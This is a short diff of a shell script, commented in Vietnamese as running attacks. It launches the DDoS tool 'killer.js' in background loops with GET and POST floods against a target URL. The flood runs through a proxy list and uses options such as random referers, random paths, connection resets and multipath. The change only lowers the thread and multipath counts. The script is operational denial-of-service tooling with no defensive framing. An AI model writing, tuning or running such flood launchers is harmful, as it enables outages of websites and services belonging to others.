@@ -42,9 +42,9 @@ done
 
 # Chạy tấn công với killer.js
 for method in GET POST; do 
-  node killer.js "$method" "$URL" "$TIME" 5 128 live.txt \
+  node killer.js "$method" "$URL" "$TIME" 5 32 live.txt \
     --query 1 --delay 1 --referer rand --http mix \
-    --close --randpath --parsed --reset --multipath 5 &
+    --close --randpath --parsed --reset --multipath 1 &
 done
 
 # Chạy tấn công với h1.js
